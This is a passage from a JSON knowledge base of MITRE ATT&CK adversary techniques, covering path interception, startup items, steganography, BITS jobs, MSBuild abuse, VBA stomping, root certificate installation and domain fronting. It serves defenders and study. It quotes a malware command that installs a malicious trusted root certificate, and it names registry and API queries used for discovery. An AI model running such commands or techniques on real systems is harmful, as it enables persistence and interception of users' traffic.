Path","description":"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.\n\nService paths ^[[1]](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree)^ and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., `C:\\unsafe path with space\\program.exe` vs. `\"C:\\safe path with space\\program.exe\"`). ^[[2]](https://isc.sans.edu/diary/Help+eliminate+unquoted+path+vulnerabilities/14464)^ (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is `C:\\program files\\myapp.exe`, an adversary may create a program at `C:\\program.exe` that will be run instead of the intended program. ^[[3]](https://securityboulevard.com/2018/04/windows-privilege-escalation-unquoted-services/)^ ^[[4]](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)^\n\nThis technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.","platforms":["Windows"],"tactics":["Persistence","Privilege Escalation","Defense Evasion"],"campaigns":[],"groups":[]},"T1608.003":{"id":"T1608.003","name":"Install Digital Certificate","description":"Adversaries may install SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.^[[1]](https://www.digicert.com/kb/ssl-certificate-installation.htm)^\n\nAdversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or lending credibility to a credential harvesting site. Installation of digital certificates may take place for a number of server types, including web servers and email servers. \n\nAdversaries can obtain digital certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) or create self-signed certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1587/003)). Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":[]},"T1037.005":{"id":"T1037.005","name":"Startup Items","description":"Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.^[[1]](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html)^\n\nThis is technically a deprecated technology (superseded by [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)), and thus the appropriate folder, `/Library/StartupItems` isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), `StartupParameters.plist`, reside in the top-level directory. \n\nAn adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism.^[[2]](https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf)^ Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.","platforms":["macOS"],"tactics":["Persistence","Privilege Escalation"],"campaigns":[],"groups":[]},"T1614.001":{"id":"T1614.001","name":"System Language Discovery","description":"Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.^[[1]](https://www.welivesecurity.com/2009/01/15/malware-trying-to-avoid-some-countries/)^\n\nThere are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Query Registry](https://attack.mitre.org/techniques/T1012) and calls to [Native API](https://attack.mitre.org/techniques/T1106) functions.^[[2]](https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/)^ \n\nFor example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language` or parsing the outputs of Windows API functions `GetUserDefaultUILanguage`, `GetSystemDefaultUILanguage`, `GetKeyboardLayoutList` and `GetUserDefaultLangID`.^[[3]](https://www.cybereason.com/blog/cybereason-vs-darkside-ransomware)^^[[4]](https://securelist.com/evolution-of-jsworm-ransomware/102428/)^^[[5]](https://securelist.com/synack-targeted-ransomware-uses-the-doppelganging-technique/85431/)^\n\nOn a macOS or Linux system, adversaries may query `locale` to retrieve the value of the `$LANG` environment variable.","platforms":["Windows","Linux","macOS"],"tactics":["Discovery"],"campaigns":["Operation Dream Job"],"groups":["Ke3chang","Lazarus Group"]},"T1095":{"id":"T1095","name":"Non-Application Layer Protocol","description":"Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.^[[1]](http://en.wikipedia.org/wiki/List_of_network_protocols_%28OSI_model%29)^ Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example.^[[2]](https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices)^ Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts.^[[3]](http://support.microsoft.com/KB/170292)^ However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.","platforms":["Windows","Linux","macOS","Network"],"tactics":["Command and Control"],"campaigns":["C0021","Operation Wocao"],"groups":["Metador","PLATINUM","FIN6","BackdoorDiplomacy","APT3","BITTER","HAFNIUM","APT29","Operation Wocao"]},"T1027.003":{"id":"T1027.003","name":"Steganography","description":"Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.\n\n[Duqu](https://attack.mitre.org/software/S0038) was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.^[[1]](https://en.wikipedia.org/wiki/Duqu)^ \n\nBy the end of 2017, a threat group used `Invoke-PSImage` to hide [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands in an image file (.png) and execute the code on a victim's system. In this particular case the [PowerShell](https://attack.mitre.org/techniques/T1059/001) code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.^[[2]](https://securingtomorrow.mcafee.com/mcafee-labs/malicious-document-targets-pyeongchang-olympics/)^  ","platforms":["Linux","macOS","Windows"],"tactics":["Defense Evasion"],"campaigns":["Operation Spalax","Operation Ghost"],"groups":["Earth Lusca","APT37","TA551","Leviathan","MuddyWater","Andariel","Tropic Trooper","BRONZE BUTLER"]},"T1584.002":{"id":"T1584.002","name":"DNS Server","description":"Adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.\n\nBy compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.^[[1]](https://blog.talosintelligence.com/2018/11/dnspionage-campaign-targets-middle-east.html)^^[[2]](https://www.fireeye.com/blog/threat-research/2019/01/global-dns-hijacking-campaign-dns-record-manipulation-at-scale.html)^  Additionally, adversaries may leverage such control in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004) to redirect traffic to adversary-controlled infrastructure, mimicking normal trusted network communications.^[[2]](https://www.fireeye.com/blog/threat-research/2019/01/global-dns-hijacking-campaign-dns-record-manipulation-at-scale.html)^^[[3]](https://www.crowdstrike.com/blog/widespread-dns-hijacking-activity-targets-multiple-sectors/)^ Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server.^[[4]](https://blogs.cisco.com/security/talos/angler-domain-shadowing)^^[[5]](https://www.proofpoint.com/us/threat-insight/post/The-Shadow-Knows)^","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":["LAPSUS$"]},"T1001.003":{"id":"T1001.003","name":"Protocol Impersonation","description":"Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  \n\nAdversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity. ","platforms":["Linux","Windows","macOS"],"tactics":["Command and Control"],"campaigns":["C0017"],"groups":["Lazarus Group","Higaisa"]},"T1012":{"id":"T1012","name":"Query Registry","description":"Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security.^[[1]](https://en.wikipedia.org/wiki/Windows_Registry)^ Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.","platforms":["Windows"],"tactics":["Discovery"],"campaigns":["Operation Wocao"],"groups":["ZIRCONIUM","Threat Group-3390","Lazarus Group","APT32","Dragonfly","Turla","Kimsuky","Stealth Falcon","Fox Kitten","APT39","Chimera","Volt Typhoon","OilRig","Operation Wocao","Dragonfly 2.0"]},"T1030":{"id":"T1030","name":"Data Transfer Size Limits","description":"An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.","platforms":["Linux","macOS","Windows"],"tactics":["Exfiltration"],"campaigns":["C0026","C0015"],"groups":["LuminousMoth","Threat Group-3390","APT28"]},"T1550.004":{"id":"T1550.004","name":"Web Session Cookie","description":"Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.^[[1]](https://wunderwuzzi23.github.io/blog/passthecookie.html)^\n\nAuthentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) or [Web Cookies](https://attack.mitre.org/techniques/T1606/001), the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.\n\nThere have been examples of malware targeting session cookies to bypass multi-factor authentication systems.^[[2]](https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/)^","platforms":["Office 365","SaaS","Google Workspace","IaaS"],"tactics":["Defense Evasion","Lateral Movement"],"campaigns":["SolarWinds Compromise"],"groups":["APT29","UNC2452"]},"T1078.002":{"id":"T1078.002","name":"Domain Accounts","description":"Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.^[[1]](https://technet.microsoft.com/en-us/library/dn535501.aspx)^ Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.^[[2]](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-accounts)^\n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or password reuse, allowing access to privileged resources of the domain.","platforms":["Linux","macOS","Windows"],"tactics":["Defense Evasion","Persistence","Privilege Escalation","Initial Access"],"campaigns":["Night Dragon","Operation Ghost","Operation CuckooBees","SolarWinds Compromise","Operation Wocao"],"groups":["Naikon","Wizard Spider","Sandworm Team","Indrik Spider","APT3","Chimera","TA505","Threat Group-1314","Magic Hound","Volt Typhoon","APT29","Operation Wocao"]},"T1218.009":{"id":"T1218.009","name":"Regsvcs/Regasm","description":"Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) assemblies. Both are binaries that may be digitally signed by Microsoft. ^[[1]](https://msdn.microsoft.com/en-us/library/04za0hca.aspx)^ ^[[2]](https://msdn.microsoft.com/en-us/library/tzat5yw6.aspx)^\n\nBoth utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: `[ComRegisterFunction]` or `[ComUnregisterFunction]` respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. ^[[3]](https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/)^^[[4]](https://lolbas-project.github.io/lolbas/Binaries/Regasm/)^","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1553.004":{"id":"T1553.004","name":"Install Root Certificate","description":"Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.^[[1]](https://en.wikipedia.org/wiki/Root_certificate)^ Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.^[[2]](http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-finding-holes-operation-emmental.pdf)^\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) capability for intercepting information transmitted over secure TLS/SSL communications.^[[3]](https://www.kaspersky.com/blog/lenovo-pc-with-adware-superfish-preinstalled/7712/)^\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.^[[4]](https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec)^\n\nIn macOS, the Ay MaMi malware uses `/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert` to install a malicious certificate as a trusted root certificate into the system keychain.^[[5]](https://objective-see.com/blog/blog_0x26.html)^","platforms":["Linux","macOS","Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1037.003":{"id":"T1037.003","name":"Network Logon Script","description":"Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects.^[[1]](https://www.petri.com/setting-up-logon-script-through-active-directory-users-computers-windows-server-2008)^ These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.  \n \nAdversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.","platforms":["Windows"],"tactics":["Persistence","Privilege Escalation"],"campaigns":[],"groups":[]},"T1499":{"id":"T1499","name":"Endpoint Denial of Service","description":"Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes^[[1]](https://www.fireeye.com/blog/threat-research/2014/11/operation-poisoned-handover-unveiling-ties-between-apt-activity-in-hong-kongs-pro-democracy-movement.html)^ and to support other malicious activities, including distraction^[[2]](https://www.ic3.gov/media/2012/FraudAlertFinancialInstitutionEmployeeCredentialsTargeted.pdf)^, hacktivism, and extortion.^[[3]](https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the-continued-rise-of-ddos-attacks.pdf)^\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.^[[4]](https://www.justice.gov/opa/pr/seven-iranians-working-islamic-revolutionary-guard-corps-affiliated-entities-charged)^\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.^[[5]](https://arstechnica.com/information-technology/2015/03/massive-denial-of-service-attack-on-github-tied-to-chinese-government/)^\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](https://attack.mitre.org/techniques/T1498).\n","platforms":["Windows","Azure AD","Office 365","SaaS","IaaS","Linux","macOS","Google Workspace","Containers"],"tactics":["Impact"],"campaigns":[],"groups":["Sandworm Team"]},"T1027.004":{"id":"T1027.004","name":"Compile After Delivery","description":"Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.^[[1]](https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf)^\n\nSource code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Phishing](https://attack.mitre.org/techniques/T1566). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.^[[2]](https://blog.trendmicro.com/trendlabs-security-intelligence/windows-app-runs-on-mac-downloads-info-stealer-and-adware/)^","platforms":["Linux","macOS","Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["Gamaredon Group","Rocke","MuddyWater"]},"T1614":{"id":"T1614","name":"System Location Discovery","description":"\nAdversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from [System Location Discovery](https://attack.mitre.org/techniques/T1614) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nAdversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings.^[[1]](https://assets.documentcloud.org/documents/20413525/fbi-flash-indicators-of-compromise-ragnar-locker-ransomware-11192020-bc.pdf)^^[[2]](https://news.sophos.com/en-us/2016/05/03/location-based-ransomware-threat-research/)^^[[3]](https://www.bleepingcomputer.com/news/security/new-rat-malware-gets-commands-via-discord-has-ransomware-feature/)^ Windows API functions such as `GetLocaleInfoW` can also be used to determine the locale of the host.^[[1]](https://assets.documentcloud.org/documents/20413525/fbi-flash-indicators-of-compromise-ragnar-locker-ransomware-11192020-bc.pdf)^ In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance.^[[4]](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-identity-documents.html)^^[[5]](https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service?tabs=windows)^\n\nAdversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.^[[6]](https://securelist.com/transparent-tribe-part-1/98127/)^^[[2]](https://news.sophos.com/en-us/2016/05/03/location-based-ransomware-threat-research/)^","platforms":["Windows","Linux","macOS","IaaS"],"tactics":["Discovery"],"campaigns":[],"groups":["SideCopy"]},"T1564.007":{"id":"T1564.007","name":"VBA Stomping","description":"Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.^[[1]](https://www.fireeye.com/blog/threat-research/2020/01/stomp-2-dis-brilliance-in-the-visual-basics.html)^\n\nMS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a `PerformanceCache` that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the `_VBA_PROJECT` stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.^[[2]](https://outflank.nl/blog/2019/05/05/evil-clippy-ms-office-maldoc-assistant/)^^[[3]](https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-ovba/ef7087ac-3974-4452-aab2-7dba2214d239)^\n\nAn adversary may hide malicious VBA code by overwriting the VBA source code location with zero’s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the `_VBA_PROJECT` stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.^[[4]](https://medium.com/walmartglobaltech/vba-stomping-advanced-maldoc-techniques-612c484ab278)^^[[1]](https://www.fireeye.com/blog/threat-research/2020/01/stomp-2-dis-brilliance-in-the-visual-basics.html)^^[[5]](https://github.com/bontchev/pcodedmp)^","platforms":["Linux","Windows","macOS"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1197":{"id":"T1197","name":"BITS Jobs","description":"Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).^[[1]](https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx)^^[[2]](https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx)^ BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.\n\nThe interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool.^[[2]](https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx)^^[[3]](https://msdn.microsoft.com/library/aa362813.aspx)^\n\nAdversaries may abuse BITS to download (e.g. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)), execute, and even clean up after running malicious code (e.g. [Indicator Removal](https://attack.mitre.org/techniques/T1070)). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.^[[4]](https://www.secureworks.com/blog/malware-lingers-with-bits)^^[[5]](https://arstechnica.com/information-technology/2007/05/malware-piggybacks-on-windows-background-intelligent-transfer-service/)^^[[6]](https://www.symantec.com/connect/blogs/malware-update-windows-update)^ BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).^[[7]](https://researchcenter.paloaltonetworks.com/2017/11/unit42-uboatrat-navigates-east-asia/)^^[[4]](https://www.secureworks.com/blog/malware-lingers-with-bits)^\n\nBITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).^[[4]](https://www.secureworks.com/blog/malware-lingers-with-bits)^","platforms":["Windows"],"tactics":["Defense Evasion","Persistence"],"campaigns":[],"groups":["Patchwork","Leviathan","APT39","APT41","Wizard Spider","Tropic Trooper"]},"T1127.001":{"id":"T1127.001","name":"MSBuild","description":"Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.^[[1]](https://msdn.microsoft.com/library/dd393574.aspx)^\n\nAdversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file.^[[1]](https://msdn.microsoft.com/library/dd393574.aspx)^^[[2]](https://docs.microsoft.com/en-us/visualstudio/msbuild/msbuild-inline-tasks?view=vs-2019#code-element)^ MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.^[[3]](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/)^","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":["Frankenstein"],"groups":["Frankenstein"]},"T1656":{"id":"T1656","name":"Impersonation","description":"Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary’s ultimate goals, possibly against multiple victims. \n \nIn many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables [Financial Theft](https://attack.mitre.org/techniques/T1657).\n\nAdversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary’s goal.   \n \nImpersonation is typically preceded by reconnaissance techniques such as [Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589) and [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591) as well as acquiring infrastructure such as email domains (i.e. [Domains](https://attack.mitre.org/techniques/T1583/001)) to substantiate their false identity.^[[1]](https://www.crowdstrike.com/cybersecurity-101/business-email-compromise-bec/)^\n \nThere is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) targeting one organization which can then be used to support impersonation against other entities.^[[2]](https://www.cloudflare.com/learning/email-security/what-is-vendor-email-compromise/#:~:text=Vendor%20email%20compromise%2C%20also%20referred,steal%20from%20that%20vendor%27s%20customers.)^","platforms":["Linux","macOS","Windows","Office 365","SaaS","Google Workspace"],"tactics":["Defense Evasion"],"campaigns":["Operation Dream Job","C0027"],"groups":["LAPSUS$"]},"T1578.005":{"id":"T1578.005","name":"Modify Cloud Compute Configurations","description":"Adversaries may modify settings that directly affect the size, locations, and resources available to cloud compute infrastructure in order to evade defenses. These settings may include service quotas, subscription associations, tenant-wide policies, or other configurations that impact available compute. Such modifications may allow adversaries to abuse the victim’s compute resources to achieve their goals, potentially without affecting the execution of running instances and/or revealing their activities to the victim.\n\nFor example, cloud providers often limit customer usage of compute resources via quotas. Customers may request adjustments to these quotas to support increased computing needs, though these adjustments may require approval from the cloud provider. Adversaries who compromise a cloud environment may similarly request quota adjustments in order to support their activities, such as enabling additional [Resource Hijacking](https://attack.mitre.org/techniques/T1496) without raising suspicion by using up a victim’s entire quota.^[[1]](https://www.microsoft.com/en-us/security/blog/2023/07/25/cryptojacking-understanding-and-defending-against-cloud-compute-resource-abuse/)^ Adversaries may also increase allowed resource usage by modifying any tenant-wide policies that limit the sizes of deployed virtual machines.^[[2]](https://learn.microsoft.com/en-us/azure/governance/policy/samples/built-in-policies#compute)^\n\nAdversaries may also modify settings that affect where cloud resources can be deployed, such as enabling [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535). In Azure environments, an adversary who has gained access to a Global Administrator account may create new subscriptions in which to deploy resources, or engage in subscription hijacking by transferring an existing pay-as-you-go subscription from a victim tenant to an adversary-controlled tenant.^[[3]](https://www.microsoft.com/en-us/security/blog/2023/09/14/peach-sandstorm-password-spray-campaigns-enable-intelligence-collection-at-high-value-targets/)^ This will allow the adversary to use the victim’s compute resources without generating logs on the victim tenant.^[[2]](https://learn.microsoft.com/en-us/azure/governance/policy/samples/built-in-policies#compute)^ ^[[4]](https://techcommunity.microsoft.com/t5/microsoft-365-defender-blog/hunt-for-compromised-azure-subscriptions-using-microsoft/ba-p/3607121)^","platforms":["IaaS"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1090.004":{"id":"T1090.004","name":"Domain Fronting","description":"Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. ^[[1]](http://www.icir.org/vern/papers/meek-PETS-2015.pdf)^ Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after 